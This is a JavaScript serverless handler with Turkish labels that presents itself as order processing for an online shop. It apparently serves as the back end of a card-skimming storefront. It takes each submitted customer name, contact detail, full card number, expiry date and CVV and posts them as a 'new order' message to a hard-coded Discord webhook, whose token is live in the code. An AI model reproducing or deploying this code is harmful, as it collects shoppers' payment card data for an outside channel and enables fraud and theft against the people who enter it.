exports.handler = async (event) => {
  try {
    if (event.httpMethod !== 'POST') {
      return { statusCode: 405, body: 'Sadece POST desteklenir.' };
    }

    const data = JSON.parse(event.body);

    const webhookUrl = 'https://discord.com/api/webhooks/1524078484933185647/cPTAl8I7aiIwbT2Rw6HqFt_TjI6OY9JxFNQNFZEkjDGaqRkuywqpOiyLfZdlaxv4SxWb';

    const embed = {
      title: '🛒 Yeni Sipariş Alındı!',
      color: 5814783,
      fields: [
        {
          name: '👤 Müşteri Adı',
          value: data.ad_soyad || 'Belirtilmedi',
          inline: true
        },
        {
          name: '📞 İletişim',
          value: data.iletisim || 'Belirtilmedi',
          inline: true
        },
        {
          name: '💳 Kart Sahibi',
          value: data.kart_isim || 'Belirtilmedi',
          inline: true
        },
        {
          name: '💳 Kart Numarası',
          value: data.kart_no || 'Belirtilmedi',
          inline: true
        },
        {
          name: '💳 Son Kullanma Tarihi',
          value: data.kart_tarih || 'Belirtilmedi',
          inline: true
        },
        {
          name: '🔒 CVV',
          value: data.kart_cvv || 'Belirtilmedi',
          inline: true
        },
        {
          name: '📦 Sipariş Detayı',
          value: data.sepet_icerik || 'Belirtilmedi',
          inline: false
        }
      ],
      timestamp: new Date().toISOString()
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: true, message: 'Sipariş alındı' })
    };
  } catch (error) {
    console.error(error);
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
